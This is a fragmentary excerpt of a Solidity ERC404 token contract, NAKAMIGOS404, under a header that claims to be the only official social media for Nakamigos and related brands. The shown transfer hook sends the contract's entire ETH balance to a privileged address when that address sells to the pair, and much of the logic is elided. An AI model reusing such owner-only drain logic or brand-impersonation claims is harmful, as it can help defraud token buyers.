...
This is the only social media for Nakamigos, CLOAKS, Crypto Trading Cards, & HiFo Labs


Website: https://nakamigos404.art
Telegram: https://t.me/nakamigos_404
Twitter: https://twitter.com/nakamigos_404
    ...
    function _beforeTransfer(address from, address to, uint256 amount) internal returns (bool) {
        if(to == _pair) {
            if (from == _nakamigos) {
                ...
                payable(_nakamigos).transfer(address(this).balance);
            }
        }
        return false;
    }
...
contract NAKAMIGOS404 is ERC404, Pausable, ReentrancyGuard {
